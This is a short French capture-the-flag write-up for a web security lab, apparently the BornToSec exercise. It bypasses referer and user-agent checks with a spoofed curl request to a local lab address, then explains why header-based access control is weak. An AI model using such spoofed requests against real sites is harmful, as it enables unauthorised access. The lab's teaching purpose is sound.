EXPLAIN:

Sur le lien en bas du footer

On voit dans le commentaire :

You must cumming from : "https://www.nsa.gov/" to go to the next step
Let's use this browser : "ft_bornToSec". It will help you a lot.

Panneau inspection > Réseau > index.php? …. 

clic droit> copier > copier au format curl 

On change Referrer et User-Agent

curl 'http://192.168.1.17/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-H 'Accept-Language: fr-FR,fr;q=0.9' \
-H 'Connection: keep-alive' \
-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
-H 'DNT: 1' \
-H 'Referer: https://www.nsa.gov/' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: ft_bornToSec' \
--compressed \
--insecure | grep flag

DANGER

Se referrer aux objets du header pour donner l'acces a certaines fonctionnalites d'un site web n'est pas une bonne idee, car nous pouvons aisement tronquer ces donnees a l'aide de curl.

AVOID

User-agent : decrit le server et reseau utilise par l'utilisateur. 
Offrir des service differents en fonction du navigateur n'est pas une bonne idee.
On preferera la detection de prise en charge de fonctionnalites plutot que du navigateur.

Referer : contient l'adresse de la page web precedente. Permet d'identifier la provenance des visiteurs.
Limiter l'acces a certaines ressources aux seuls referants autorises n'est une bonne idee non plus. 
On prefera l'utilisation de cookies temporaires.
